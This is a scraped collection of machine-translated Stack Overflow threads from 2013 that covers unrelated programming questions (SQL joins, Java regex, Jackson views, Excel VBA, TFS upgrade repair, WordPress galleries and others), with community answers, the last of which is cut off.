> 标签：json, facebook-opengraph

我想弄清楚这个 url 的 id 是什么？[https://www.facebook.com/media/set/?set=a.10151316456544622.551539.197509829621&type=3](https://www.facebook.com/media/set/?set=a.10151316456544622.551539.197509829621&type=3)

我不需要用代码来做，我只需要将数字插入我已经工作的 JSON 脚本。

我似乎无法从此页面中提取正确的号码，但其他页面并没有给我带来问题..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:02:17.820

If you have album `URI` like you have mentioned in your question, Album ID is the string between `a.` and first `.` in the `set` parameter of album url.

For example, in the url

> https://www.facebook.com/media/set/?set=a.10151316456544622.551539.197509829621&type=3

Album ID should be `10151316456544622`

# asp.net - 存储半静态数据的最佳方法

> ID：15973105
> 
> 赞同：0
> 
> 时间：2013-04-12T13:50:50.267
> 
> 标签：asp.net, xml, database, caching

我需要访问我的 asp.net 网站上的一些数据。这些数据涉及大约 50 家贷款提供商。

我现在可以简单地将它构建到网页中，但是我知道我很快需要重新使用它，所以最好让它更易于访问。

数据可能只会偶尔更改一次，最多可能一个月一次。我正在研究存储数据的最佳方法 - 数据库/xml 文件，然后如何将其保存在我的站点中（也许是缓存）。

我的经验很少，所以不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T13:57:09.560

很难击败数据库，并且通过将其放置在那里，您可以轻松地从任何想要重用它的地方访问它。根据获取更新的方式和使用的 DBMS，您可以使用 SSIS（用于 MS SQL Server）之类的工具来自动更新数据。

ASP.NET 还有一个健壮的 API，用于与数据库交互并将其用作许多 UI 结构的数据源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:14:12.187

关系数据库是用于在需要仔细控制对数据的访问以确保其原子性、一致性、隔离性和持久性时存储数据的工具。（酸）。为了实现这一点，数据库包括大量额外的基础设施开销和处理逻辑。如果您不需要这种开销，为什么要让您的系统受到它的影响？您可以使用范围广泛的其他数据存储选项，这些选项可能更合适，但至少应在您的决策过程中被视为选项。

使用 Asp.Net，您可以访问其他几个选项，包括文本文件、自定义配置文件（存储为 Xml）、自定义 Xml 以及序列化为二进制或 Xml 文件的 dotNet 类。您的数据很少更改的事实可能会使这些选项之一更合适。使用这些选项之一还可以减少系统耦合。依赖此数据的功能现在不再依赖于功能数据库的存在。

# java - 无法使用 JSCH SCP 覆盖文件

> ID：15973107
> 
> 赞同：2
> 
> 时间：2013-04-12T13:50:58.373
> 
> 标签：java, scp, jsch

首先，对不起我糟糕的英语......

我正在使用 JSCH 通过 SCP 上传文件，它运行良好。

我唯一的问题是，当目标文件已经存在并且属于另一个用户时，我无法覆盖该文件，即使我在文件的同一组中并且权限设置为 664。

服务器返回的消息是：

```
set mode: Operation not permitted 
```

似乎JSCH在上传后设置了权限，但因为我不是文件的所有者而失败。这是我的代码的一部分：

```
// Send "C0644 filesize filename", where filename should not include '/'
int filesize = (int) localFile.length();
String command = "C0644 " + filesize + " ";
command += localFile.getName();
command += "\n"; 
```

有没有办法告诉 JSCH 不要更改权限？

我试图在命令中删除 C0644 但当然它失败了:)

不幸的是，我没有找到任何关于 JSCH 的文档。

# java - 用于提取 xml 标记的正则表达式，包括可能具有 CDATA 标记的 xml 标记

> ID：15973110
> 
> 赞同：0
> 
> 时间：2013-04-12T13:51:03.420
> 
> 标签：java, regex

我的字符串中通常有 xml 标签。但现在我有一个包含一些 html 标记的标签。一个字符串可以包含，`<hg>This is text</hg>`或`<html><![CDATA[<table>this is table</table>]]</html>`。我只想用空字符串替换外部标签。因此，在第一种情况下，`<hg></hg>`将被空字符串替换，而在第二种情况下，将被空字符串`<html></html>`替换。我正在使用外部 api 并且只能为此使用正则表达式？我试过了

```
String retVal = original.replace("`<.*?>.*</.*>`",""); but it didn't work. 
```

编辑：

我希望结果产生为`<!CDATA[[<table>winter</table>]]> String original = "<html><![CDATA[[<table>winter</table>]]></html>" String retval = original.replaceAll("<([^>]*)>(?:[^<]|<!\[CDATA\[.*?]]>)*</\\1>", "");`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T16:28:02.753

假设没有相同类型的嵌套标签，您可以使用

```
String retVal = original.replaceAll(
    "(?s)<(\\w+)(?: [^>]*)?>(\\s*<!\\[CDATA\\[.*?\\]\\]>\\s*|.*?)</\\1>", "$2"
); 
```

`(?s)`打开单行模式，因此`.`也匹配换行符。
`\\1`是匹配的任何内容`(\\w+)`，即它是标签名称。
`$2`是标签内的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:15:34.293

尝试：

```
String retVal = original.replace("<([^>]*)>([^<]|<!\\[CDATA\\[.*?]]>)*</\\1>","$2"); 
```

尽管如此，如果您的标签具有属性，它会失败（尽管可以更改它以适应）。

**编辑：**
编辑，因为我没有看到你的例子中的缺陷。您在 CDATA 末尾缺少一个“>”。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T14:43:57.450

这个任务对于正则表达式来说似乎太复杂了，我只能提供一个算法解决方案

```
 String s = "<hg>This is text</hg> or <html><![CDATA[<table>this is table</table>]]</html>.";
    StringBuilder sb = new StringBuilder();
    for(int i = 0; i != -1;){
        i = s.indexOf("<![CDATA[", i);
        if (i != -1) {
            sb.append(s.substring(0, i).replaceAll("<.*?>", ""));
            int j = s.indexOf("]]");
            sb.append(s.substring(i + 9, j));
            s = s.substring(j + 2);
            i = 0;
        } 
    }
    sb.append(s.replaceAll("<.*?>", ""));
    System.out.println(sb); 
```

输出

```
This is text or <table>this is table</table>. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-12T17:50:55.003

以下示例是在 C# 中。为 Java 修改它。

```
string result = Regex.Replace(input, @"<(\w+)>(.*)</\1>", "$2"); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-12T19:40:33.867

“（？（？！]）”

如果我理解你并使用你的示例中的 replaceAll 方法，这应该符合你想要的，它只匹配并且

# c# - 使用 SUM 和 GROUP BY 左连接 2 个表

> ID：15973114
> 
> 赞同：-1
> 
> 时间：2013-04-12T13:51:05.140
> 
> 标签：c#, sql

这是我的表：

```
Table: Catalog                  Table: Inventory
--------------                  ----------------
catalogId      - int [PK]       inventoryId        - int [PK]  
itemName      - nvarchar        inventoryTimeStamp - datetime
itemType      - bit             quantity           - float
catalogNumber - int             catId              - int [FK] 
```

我的问题是：我如何加入表格（左加入它们）并总结库存表中物品的数量，所以我可以打印：itemName、catalogNumber 和 sum。

我试过这个：

```
SELECT Catalog.itemName, Inventory.catId, SUM(Inventory.quantity) AS Sum
FROM Catalog
LEFT JOIN Inventory ON Inventory.catId = Catalog.catalogId
GROUP BY Inventory.catId 
```

但我得到一个例外：

> 列“Catalog.itemName”在选择列表中无效，因为它既不包含在聚合函数中，也不包含在 GROUP BY 子句中。

我应该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T13:53:01.983

只需添加

`GROUP BY Catalog.itemName, Inventory.catId, Inventory.quantity`

它会起作用。

当您有`sum`等`count`时，您需要`GROUP BY`在查询末尾添加

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T13:53:12.040

您只需要将所有非聚合列添加到`GROUP BY`子句中，

```
SELECT Catalog.itemName, 
       Inventory.catId, 
       SUM(Inventory.quantity) AS Sum 
FROM   Catalog 
       LEFT JOIN Inventory 
           ON Inventory.catId = Catalog.catalogId 
GROUP  BY Catalog.itemName, Inventory.catId 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-12T13:53:33.777

您将需要`Catalog.itemName`从您的条款中删除`SELECT`或将其包含在您的`Group By`条款中。

# excel - 当我另存为时，如何让我的 Excel 工作表为文件名提取某些单元格值？

> ID：15973118
> 
> 赞同：0
> 
> 时间：2013-04-12T13:51:08.313
> 
> 标签：excel, vba

好的，我会尽力解释这一点。我有一个 Excel 工作簿，将用作成本表。此工作表的顶部将是提案编号（在单元格 D3 中）、在单元格 D4 中的客户名称）和系统大小（在单元格 D5 中）。因此，假设我的工作表是针对客户上海中午和系统大小 2500 的提案编号 4423。我希望在单击另存为时自动将文件命名为“4423 Shanghai Noon SCR-2500 Tsoc”。有没有办法用宏或任何其他方式做到这一点？任何意见是极大的赞赏。

好的，这是我从录制宏中得到的代码，但它一直说编译错误：预期：语句结束。我不知道如何使它使用“另存为”中这些单元格中的文本。

```
ActiveWorkbook.SaveAs Filename:= _
    "C:\Users\walkerja\Documents\CU Proposals\Range("D3").Select Range("D4").Select SCR-Range("D5").Select Tsoc.xlsm", FileFormat:= _
    xlOpenXMLWorkbookMacroEnabled, CreateBackup:=False 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T18:28:40.690

将您的代码更改为：

```
Dim part1 As String
Dim part2 as String
Dim part3 as String

part1 = Range("D3").Value
part2 = Range("D4").Value
part3 = Range("D5").Value

ActiveWorkbook.SaveAs Filename:= _
"C:\Users\walkerja\Documents\CU Proposals\" & part1 & " " & part2 & " SCR-" & part3 & " Tsoc.xlsm", FileFormat:= _
xlOpenXMLWorkbookMacroEnabled, CreateBackup:=False 
```

您将字符串值与电子表格操作方法混合在一起。您需要先获取单元格的值，然后可以使用这些值为文件名构建字符串。

# c++ - 将方法限制为 c++ 中的几个类

> ID：15973123
> 
> 赞同：2
> 
> 时间：2013-04-12T13:51:36.093
> 
> 标签：c++, templates, c++11

我有一个通知类，它的界面类似于以下（有一些语法问题）：

```
template<typename ...T>
Notification
{

public:
void addObserver(std::function<void (T...)> o);
void notify(T...);
}; 
```

然后有一个作为通知中心的主机类：

```
class NotificationCenter
{

public:
    Notification<int, int> mPointChangedNotification;
}; 
```

最后，有一个实际的观察者来监听通知：

```
class Listener
{
void someFunction(int, int)
{
}

void SomeMethod(NotificationCenter &m)
{
m.mPointChangedNotification.addObserver(someFunction);
}
}; 
```

到目前为止，一切都很好。但问题是即使实际观察者也可以看到 notify 函数，而它应该只能被 NotificationCenter 类访问。如果有人可以帮助解决这个设计问题，那将非常有帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T13:55:36.270

如果您在设计访问控制策略时不需要太大的灵活性，您可以简单地制作您的`NotificationCenter`类模板（同样，提供私有可访问性）：`friend``Notification``notify()`

```
template<typename ...T>
Notification
{
public:
    void addObserver(std::function<void (T...)> o);
private:
    friend class NotificationCenter;
    void notify(T...);
}; 
```

这样，`NotificationCenter`将允许调用`notify()`，但所有其他客户端只能访问`addObserver()`.

* * *

如果您想允许更大的灵活性，您可以让`Notification`接受进一步的模板参数，并使该模板参数中指定的类型`friend`为`Notification`. 然后，您可以提供`notify()`私有可访问性，以便其他非`friend`类将无法调用它：

```
template<typename F, typename ...T>
Notification
{
public:
    void addObserver(std::function<void (T...)> o);
private:
    friend class F;
//  ^^^^^^^^^^^^^^^
    void notify(T...);
}; 
```

# ruby-on-rails - minitest的唯一性检验

> ID：15973129
> 
> 赞同：0
> 
> 时间：2013-04-12T13:51:56.260
> 
> 标签：ruby-on-rails, ruby, model, minitest

我在 Ruby on Rails 上使用 minitest。下面是我的模型。

```
require 'mongoid'
class Person
  include Mongoid::Document
  index({ pin: 1 }, { unique: true, name: "pin_index" })
  field :first_name
  field :last_name
  field :pin

  validates :pin,                presence: true, uniqueness: true
  validates :first_name,         presence: true
  validates :last_name,          presence: true
end 
```

我尝试编写模型测试。我想编写一个测试来控制 pin 字段是否唯一。我怎样才能做到这一点？任何想法？

我尝试编写如下测试：

```
it 'must not be valid' do
  person_copy = person.dup
  person.save
  person_copy.save
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:07:12.560

您可以使用[`assert_includes`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/minitest/unit/rdoc/MiniTest/Assertions.html#method-i-assert_includes)and[`assert_same`](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/minitest/unit/rdoc/MiniTest/Assertions.html#method-i-assert_same)来测试错误是否正确（关于唯一性）：

```
it 'must not be valid' do
  person_copy = person.dup
  person.save
  person_copy.save
  assert_includes person.errors, :pin
  assert_same person.errors[:pin], "pin is not unique (replace with actual error message)"
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:04:33.600

你可以这样写测试：

```
it 'must have unique pin' do
  person_copy = person.dup
  proc { person_copy.save! }.must_raise(Mongoid::Errors::Validations)
  person_copy.errors.must_include(:pin)
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-19T15:20:59.580

考虑到您已经设置了夹具，您可以这样做：

```
test 'pin must be unique' do
  new_person = Person.new(@person.attributes)
  refute new_person.valid?
end 
```

# c++ - C++ 队列中的错误

> ID：15973132
> 
> 赞同：0
> 
> 时间：2013-04-12T13:52:02.047
> 
> 标签：c++

我不明白这段代码有什么问题。我得到了几个

> C2227：“->status”左侧必须指向类/结构/联合/通用类型
> 
> C2065：“头”：未声明的标识符

和

> C3861：“主要”：找不到标识符

我想访问位于队列头部的项目的状态，并在定义中给出的 3 个状态之间更改它的值。但是我在尝试访问它时做错了我不知道的事情。这是代码：

```
#define TOTALPACKETS 100
#define WINDOW   5
#define ACK      2
#define PENDING  1
#define NEW      0 

typedef int Item ;
typedef struct node *link;  
struct node{                
    Item data;
    Item status;
    link next; 
};

int QUEUEempty(link head){
    return head==NULL;
}

void QUEUEput(link *head, link *tail, Item data, Item status){
    if (*head==NULL){
                    (*tail)=(link)malloc(sizeof(node)); 
                    (*tail)->data=data;
                    (*tail)->next=NULL;
                    (*tail)->status=NEW;
                    *head=*tail;
                    return;}
    (*tail)->next=(link)malloc(sizeof(node));
    *tail=(*tail)->next;
    (*tail)->data=data;
    (*tail)->next=NULL;
    (*tail)->status=NEW;
    return;
}

Item QUEUEget(link *head){
    Item data=(*head)->data;
    link t=*head;
    *head=(*head)->next;
    free(t);
    return data; 
}

void send(int sPacket){
    (*head)->status=PENDING;//c2227,c2065
    printf("Packet No. %d: %d",sPacket,*head->status);//c2227,c2065
}

void receive(){
    if ((*head)->status==PENDING || (*head)->status=NEW) {//c2227,c2065
        (*head)->status=ACK; //c2227,c2065
          }
    }

int main() { 
    int i,j,k,packets=0;
    link head=NULL,tail=NULL;
    for(i=0;i<TOTALPACKETS;i++){
            QUEUEput(&head,&tail,i,NEW);
            packets++;
    }
    while(!QUEUEempty(head)){   
        for (j=0;j<WINDOW;j++){
            k=TOTALPACKETS-packets;
            send(k);
            receive();
            if ((*head).status==ACK){
            printf("Packet No. %d: %d",k,*head->status); 
            QUEUEget(&head);
            }
        }
    }
return 0;
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T13:53:28.010

您未能`head`通过`send()`and `receive()`。

至于您的`main()`，请参阅[C++ 中 main 签名的参数是否具有 unsiged 和 const 限定符？](https://stackoverflow.com/questions/1621574/mains-signature-in-c)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T13:54:48.543

main 有一个预定义的形式。您可以使用：

```
int main ()  /* or: int main(int argc, char* argv[]) */  { 
```

还：

```
typedef int Item ;
struct node;
typedef node* link;  
struct node{                
    Item data;
    Item status;
    link next; 
};

...
   link head=nullptr,tail=nullptr;
...
   if (head->status==ACK){
        printf("Packet No. %d: %d",k, head->status); 

} 
```

`head`是一个`link`，指向的指针`node`。另外，您忘记传递`head`给`send`and `receive`。

```
void send(int sPacket,link head ){ 
```

利用`send(sPacket,head)`

# tfs - TFS 2012 更新失败：身份同步错误...未完成帐户名称和安全 ID 之间的映射

> ID：15973140
> 
> 赞同：0
> 
> 时间：2013-04-12T13:52:18.833
> 
> 标签：tfs

将我们的 TFS 2010 升级到 TFS 2012，我在其中一个集合上收到此错误：

`[Error] Sync error for identity: System.Security.Principal.WindowsIdentity, S-1-5-21-xxxxxxx - No mapping between account names and security IDs was done`

升级失败。从管理控制台重新运行服务作业会导致相同的错误。

我查看了数据库，其中有一个条目，`ADObjects`其中两者都`SamAccountName`具有`ObjectSID`该 SID。它看起来像来自旧域的帐户。`fDeleted`是 1。

如何清理它以便升级？

添加的信息（来自 SQL 跟踪）：

`declare @p3 dbo.typ_ServicingStepDetail2 insert into @p3 values(1,'ToDev11Beta1FinalConfiguration','BuildToDev11Beta1FinalConfiguration','Grant Administer Build Permissions to Project Administrators','2013-04-12 14:17:55.617',NULL,0,N'Microsoft.TeamFoundation.Framework.Server.IdentitySyncException: Sync error for identity: System.Security.Principal.WindowsIdentity, S-1-5-21-xxxxx - No mapping between account names and security IDs was done at Microsoft.TeamFoundation.Framework.Server.TeamFoundationIdentityService.TryReadIdentityFromSourceInternal(TeamFoundationRequestContext requestContext, IdentityDescriptor descriptor, Boolean withDirectMembership, TeamFoundationIdentity& identity) at Microsoft.TeamFoundation.Framework.Server.TeamFoundationIdentityService.AddMemberToApplicationGroup(TeamFoundationRequestContext requestContext, IdentityDescriptor groupDescriptor, IdentityDescriptor memberDescriptor, Boolean errorOnDuplicate, Boolean logSync, Boolean ensureKnown) at Microsoft.TeamFoundation.Framework.Server.TeamFoundationIdentityService.EnsureIsMember(TeamFoundationRequestContext requestContext, IdentityDescriptor groupDescriptor, IdentityDescriptor descriptor) at Microsoft.TeamFoundation.Framework.Server.TeamFoundationSecurityNamespace.EnsureIdentityIsKnownInternal(TeamFoundationRequestContext requestContext, IdentityDescriptor identity, Boolean throwOnFailure) at Microsoft.TeamFoundation.Framework.Server.TeamFoundationSecurityNamespace.SetAccessControlEntries(TeamFoundationRequestContext requestContext, String token, IEnumerable`Microsoft.TeamFoundation.Framework.Server.TeamFoundationSecurityNamespace.SetAccessControlEntries(TeamFoundationRequestContext requestContext, String token, IEnumerable`1 accessControlEntries, Boolean merge) at Microsoft.TeamFoundation.Server.Servicing.TFCollection.BuildStepPerformer.GrantAdministerPermissionsToProjectAdmins 的 1 accessControlEntries, Boolean merge, Boolean throwOnInvalidIdentity) (TeamFoundationRequestContext requestContext, ServicingContext servingContext) 在 Microsoft.TeamFoundation.Framework.Server.TeamFoundationStepPerformerBase.Microsoft.TeamFoundation.Framework.Server.IStepPerformer.PerformStep(String servingOperation, String stepType, String stepData, ServicingContext servingContext) 在 Microsoft.TeamFoundation.Framework.Server .ServicingStepDriver.PerformServicingStep(ServicingStep 步骤,ServicingContext servingContext, ServicingStepGroup 组, ServicingOperation servingOperation, Int32 stepNumber, Int32 totalSteps)') 插入@p3 值(2,'ToDev11Beta1FinalConfiguration','BuildToDev11Beta1FinalConfiguration','Grant Administer Build Permissions to Project Administrators','2013-04-12 14 :17:55.617',5,NULL,NULL)

exec prc_AddServicingStepDetails @jobId='xxx',@queueTime='2013-04-12 14:17:50.840',@stepDetails=@p3,@hostId='xxx',@completedStepCount=419`

所以看起来我可能有一个不再存在的项目管理员。关于如何手动删除该成员资格的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T16:47:01.323

好的，我通过执行以下操作完成了升级。

**这是非常肮脏和危险的。不要在没有良好备份的情况下尝试。您的保修已过期。这可能不适合你。它可能会破坏您的整个 TFS 设置并给您的小狗带来疾病。**

反正。

打开 SQL Server 管理工作室。为不会升级的项目集合打开一个新的查询窗口（通常`Tfs_NameOfCollectionThatWontUpgrade`）。执行这个命令：

```
Select TeamFoundationId From ADObjects
Where ObjectSID='S-1-xxxx' 
```

（显然，从错误消息中插入正确的 SID。）

这将为您提供导致问题的身份的内部 GUID。我升级失败的步骤是向项目管理员授予构建管理员权限，而且哇，我可以自己做。

现在从轨道中删除 Active Directory 链接（您确实复制了该 GUID，对吗？）

```
Delete From ADObjects
Where ObjectSID='S-1-xxxxx' 
```

（显然，从错误消息中插入正确的 SID。另外请注意，这一步可能不是绝对必要的，但这是我执行的一步，如果我回滚看看你是否可以不使用它，我会被诅咒的。）

啊，一定要爱上电锯手术。更多的事情要做。让我们从所有组中删除此身份。**注意：如果您对您唯一的管理员帐户执行此操作，您可能会将自己排除在集合和/或其中的项目之外。你被警告了。**

切换到配置数据库（通常`Tfs_Configuration`）并执行

```
Delete From tbl_GroupMembership 
Where MemberId='The GUID you remembered' 
```

此时，用户不再是任何成员，升级应该完成。一切都应该在那里：构建、工作项和源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-07T14:32:16.907

当我的 TFS 服务器使用 TFS 2012 Update 1 时，我遇到了一个非常相似的问题（几乎相同）。我也想出了这个 hack 来解决它。当我有一个运行 TFS 2012 RTM 或 TFS 2012 Update 2 的 TFS 服务器时，我没有遇到这个问题。

这是该线程的链接。 [http://social.msdn.microsoft.com/Forums/en-US/tfsadmin/thread/238cad96-8e74-4f14-869a-3bb5e0629fd7](http://social.msdn.microsoft.com/Forums/en-US/tfsadmin/thread/238cad96-8e74-4f14-869a-3bb5e0629fd7)

# json - Jackson @JsonView 没有按预期工作

> ID：15973141
> 
> 赞同：4
> 
> 时间：2013-04-12T13:52:18.913
> 
> 标签：json, spring, spring-mvc, jackson

我将 Jackson JSON 1.9.12 与 SpringMVC 一起使用。我创建了一个带有 JSON 字段的 dto。我想要两个具有不同 JSON 字段的相同 dto 配置文件，所以我创建了两个接口，并用注释对字段进行了`@JsonView`注释。

```
class Views {
    static class Public {}
    static class ExtendedPublic {}
    ...
}

public class Thing {
    @JsonView(Views.Public.class) Integer id;
    @JsonView(Views.ExtendPublic.class) String name;
} 
```

在控制器中

```
@RequestMapping(value = "/thing/{id}")
public void getThing(@PathVariable final String id, HttpServletResponse response) {
    Thing thing = new Thing();
    ObjectMapper objectMapper = new ObjectMapper();
    String json = objectMapper.writerWithView(Views.Public.class).writeValueAsString(thing);
    LOG.debug("JSON: {}", json);
} 
```

我希望 JSON 只包含“id”字段，但它总是包含所有字段。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T15:56:57.263

以下代码使用 Spring 3.2.0 和 Jackson 1.9.12 进行了测试，它们只是返回`{id: 1}`而不是扩展`{name: "name"}`，因为它使用 .writerWithView(Views.Public.class)。切换到 Views.ExtendPublic.class 将导致`{"id":1,"name":"name"}`

**编辑：**添加所有项目文件以获得完整的解决方案，这比我在[使用 @JsonView 和 Spring MVC上的另一个更好的答案](https://stackoverflow.com/questions/5772304/using-jsonview-with-spring-mvc/)

**演示控制器.java**

```
package com.demo.app;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.codehaus.jackson.map.annotate.JsonView;
import org.codehaus.jackson.map.ObjectMapper;
import org.codehaus.jackson.map.ObjectWriter;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class DemoController {
    private final ObjectMapper objectMapper = new ObjectMapper();

    @RequestMapping(value="/jsonOutput")
    @ResponseBody
    public String myObject(HttpServletResponse response) throws IOException {
        ObjectWriter objectWriter = objectMapper.writerWithView(Views.Public.class);
        return objectWriter.writeValueAsString(new MyObject());
    }

    public static class Views {
        static class Public {}
        static class ExtendPublic extends Public {}
    }

    public class MyObject {
        @JsonView(Views.Public.class) Integer id = 1;
        @JsonView(Views.ExtendPublic.class) String name = "name";
    }
} 
```

**web.xml**

```
<web-app xmlns="http://java.sun.com/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
  version="3.0"/> 
```

**初始化程序.java**

```
package com.demo.app.spring;

import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;
import org.springframework.web.WebApplicationInitializer;
import org.springframework.web.servlet.DispatcherServlet;
import javax.servlet.*;

public class Initializer implements WebApplicationInitializer {
    public void onStartup(ServletContext servletContext) throws ServletException {
        AnnotationConfigWebApplicationContext mvcContext = new AnnotationConfigWebApplicationContext();
        mvcContext.register(AppConfig.class);

        ServletRegistration.Dynamic dispatcher = servletContext.addServlet("dispatcher", new DispatcherServlet(mvcContext));
        dispatcher.setLoadOnStartup(1);
        dispatcher.addMapping("/*");
    }
} 
```

**AppConfig.java**

```
package com.demo.app.spring;

import org.springframework.context.annotation.*;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.view.InternalResourceViewResolver;

@Configuration
@EnableWebMvc
@ComponentScan(basePackages="com.demo.app")
public class AppConfig {
} 
```

**pom.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.demo</groupId>
    <artifactId>app</artifactId>
    <version>1.0.0-SNAPSHOT</version>
    <packaging>war</packaging>
    <name>${project.artifactId}</name>
    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <spring.version>3.2.0.RELEASE</spring.version>
        <jetty.plugin.version>8.1.7.v20120910</jetty.plugin.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-webmvc</artifactId>
            <version>${spring.version}</version>
        </dependency>
        <dependency>
            <groupId>org.codehaus.jackson</groupId>
            <artifactId>jackson-core-asl</artifactId>
            <version>1.9.12</version>
        </dependency>
        <dependency>
            <groupId>org.codehaus.jackson</groupId>
            <artifactId>jackson-mapper-asl</artifactId>
            <version>1.9.12</version>
        </dependency>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>servlet-api</artifactId>
            <version>3.0.1</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <finalName>${project.artifactId}</finalName>
        <plugins>
            <plugin>
                <groupId>org.mortbay.jetty</groupId>
                <artifactId>jetty-maven-plugin</artifactId>
                <version>${jetty.plugin.version}</version>
                <configuration>
                    <webApp>
                        <contextPath>/</contextPath>
                    </webApp>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project> 
```

在以下结构中：

```
pom.xml
src
  |- main
      |- java
      |    |- com
      |        |- demo
      |             |- app
      |                 |- controller/DemoController.java
      |                 |- spring/AppConfig.java, Initializer.java
      |- webapp
           |- WEB-INF/web.xml 
```

# c# - 用于排序或筛选表实体的 Azure 定价

> ID：15973144
> 
> 赞同：0
> 
> 时间：2013-04-12T13:52:31.053
> 
> 标签：c#, azure, azure-storage, azure-table-storage

我对 Windows azure 很陌生。我只是好奇用于排序或过滤天蓝色存储表的事务数计算是如何工作的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T18:29:04.183

服务器不支持排序，因此它当然不收费。过滤本身不计费，但根据您的操作，它会影响任何给定查询所需的事务数量。

一个给定的事务最多可以返回 1000 个实体，并且只有当它们都在同一个分区服务器上时才会返回。因此，一个非常有选择性的过滤器将导致返回的实体更少，这可能需要更少的事务。非选择性过滤器（或无过滤器）可能会返回许多需要多个事务来检索的实体。事务的数量也可能受到分区的数量和大小的影响，这由您为实体选择的 PartitionKey 控制。

也就是说，交易非常便宜，每十万笔交易一美分。它们不太可能占您成本的很大一部分。除非您非常确定需要，否则不要花时间担心交易成本。

# php - 如何循环获取 WP Gallery 图像信息

> ID：15973145
> 
> 赞同：0
> 
> 时间：2013-04-12T13:52:39.153
> 
> 标签：php, wordpress, slider, image-gallery

我正在为一个网站制作一个滑块，图片来自 WP 帖子的画廊，效果很好。但我想要那里的图像信息，例如图像的标题和描述。这是我当前的代码和我的滑块的循环，它完美地工作。

函数.php：

```
<?php function aldenta_get_images($size = 'thumbnail') {
    global $post;

    $photos = get_children( array('post_parent' => $post->ID, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => 'ASC', 'orderby' => 'menu_order ID') );

    $results = array();

    if ($photos) {
        foreach ($photos as $photo) {
            // get the correct image html for the selected size
            $results[] = wp_get_attachment_image($photo->ID, $size);
        }
    }

    return $results;
} ?> 
```

页：

```
<?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>
            <div class="banner">

                <ul class="rslides">
                            <?php $galleryimages = aldenta_get_images('medium');
                            foreach ($galleryimages as $galleryimage ) { ?>
                        <li>
                            <?php echo $galleryimage; ?>

                                <div class="slider-desc">
                                    <div class="slider-desc-text">
                                    <div class="slider-desc-title"><h1></h1></div>
                                    <div class="slider-desc-content"><?php  ?></div>
                                    <div class="slider-link"><a href="#"><img src="<?php bloginfo('template_directory'); ?>/images/slider-arrow.png"></a></div>
                                    </div>
                                </div>

                            <?php } ?>

                        </li>

                        <?php endwhile; else: ?>
                        <?php endif; ?>

                </ul> 
```

我只希望图像信息显示在图像上，您可以看到我没有当前功能，只需将该信息放入循环中以显示每张幻灯片。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:10:35.330

在您的 function.php 文件中，您可以：

```
 foreach ($photos as $photo) {
        // get the correct image html for the selected size
        $results[]['content'] = wp_get_attachment_image($photo->ID, $size);
        $results[]['title'] = get_the_title($photo->ID);
    } 
```

接着

```
 <?php $galleryimages = aldenta_get_images('medium');
                        foreach ($galleryimages as $galleryimage ) { ?>
                    <li>
                        <?php echo $galleryimage['content']; ?>

                            <div class="slider-desc">
                                <div class="slider-desc-text">
                                <div class="slider-desc-title"><h1><?php echo $galleryimage['title']; ?></h1></div>
                                <div class="slider-desc-content"><?php  ?></div>
                                <div class="slider-link"><a href="#"><img src="<?php bloginfo('template_directory'); ?>/images/slider-arrow.png"></a></div>
                                </div>
                            </div>

                        <?php } ?> 
```

此处的示例仅用于获取标题。我相信你可以对内容或任何你想要的东西做同样的事情（例如元数据）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:15:46.037

图像`alt`文本存储在`post_meta`表格中，`meta_key` `_wp_attachment_image_alt`while `title`, `caption`,`description`存储在`wp_posts`下面是演示如何获取这些

```
